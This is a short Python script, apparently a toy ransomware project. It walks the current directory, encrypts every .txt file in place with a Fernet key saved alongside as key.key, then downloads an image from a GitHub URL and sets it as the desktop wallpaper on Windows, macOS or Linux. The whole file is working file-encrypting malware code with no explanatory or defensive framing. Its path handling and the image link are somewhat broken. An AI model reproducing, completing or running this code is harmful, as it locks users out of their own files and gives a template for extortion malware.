from cryptography.fernet import Fernet
import os
import ctypes
import platform
import urllib.request

# Generate key
key=Fernet.generate_key()

# Save key to file
with open("key.key","wb") as f:
    f.write(key)

# Create Fernet object with the generated key
fernet = Fernet(key)

# Encrypt content of text files
for i in os.walk(os.getcwd()):
    # print(i[2])
    for j in i[2]:
        if str(j).endswith(".txt"):
            # print(j)
            with open(str(j),"r") as f:
                data=f.read()

            encrypted = fernet.encrypt(data.encode())

            with open(str(j),"wb") as f:
                f.write(encrypted)

            # print(encrypted)
                
            # # add new extention   
            # new_file_path =  j + ".asu"
            # os.rename(j, new_file_path)

# Get the file
def download_file(url, destination):
    urllib.request.urlretrieve(url, destination)

# Change Wallpaper
def changeWallpaper(file_path):
    system = platform.system()
    if system == "Windows":
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)

    elif system == "Darwin":
        script = f'tell application "Finder"\nset desktop picture to POSIX file "{file_path}"\nend tell'
        os.system(f"osascript -e '{script}'")

    elif system == "Linux":
        os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{file_path}")

    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    wallpaper_url = "https://github.com/tompilooo/EncryptFile/blob/main/bt.jpg"
    download_path = "bt.jpg"
    
    # Download the file
    download_file(wallpaper_url, download_path)

    # Change the wallpaper using the downloaded file
    changeWallpaper(download_path)

    # Optionally, remove the downloaded file after changing the wallpaper
    os.remove(download_path)